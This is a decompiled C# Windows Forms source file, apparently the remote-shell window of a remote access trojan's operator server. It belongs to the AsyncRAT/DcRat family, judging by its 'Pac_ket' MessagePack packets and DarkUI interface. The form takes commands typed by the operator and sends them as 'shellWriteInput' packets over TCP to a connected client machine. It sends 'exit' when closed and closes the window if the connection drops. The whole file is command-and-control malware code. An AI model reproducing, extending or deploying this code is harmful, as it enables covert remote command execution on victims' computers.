using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000063 RID: 99
	public partial class FormShell : DarkForm
	{
		// Token: 0x170000B0 RID: 176
		// (get) Token: 0x060003E9 RID: 1001 RVA: 0x0002790C File Offset: 0x0002790C
		// (set) Token: 0x060003EA RID: 1002 RVA: 0x00027914 File Offset: 0x00027914
		public global::Form1 F { get; set; }

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x060003EB RID: 1003 RVA: 0x00027920 File Offset: 0x00027920
		// (set) Token: 0x060003EC RID: 1004 RVA: 0x00027928 File Offset: 0x00027928
		internal Clients Client { get; set; }

		// Token: 0x060003ED RID: 1005 RVA: 0x00027934 File Offset: 0x00027934
		public FormShell()
		{
			this.InitializeComponent();
		}

		// Token: 0x060003EE RID: 1006 RVA: 0x00027944 File Offset: 0x00027944
		private void TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.Client != null && e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				if (this.textBox1.Text == "cls".ToLower())
				{
					this.richTextBox1.Clear();
					this.textBox1.Clear();
				}
				if (this.textBox1.Text == "exit".ToLower())
				{
					base.Close();
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x060003EF RID: 1007 RVA: 0x00027A3C File Offset: 0x00027A3C
		private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
				msgPack.ForcePathObject("WriteInput").AsString = "exit";
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
			}
			catch
			{
			}
		}

		// Token: 0x060003F0 RID: 1008 RVA: 0x00027AB4 File Offset: 0x00027AB4
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}
	}
}
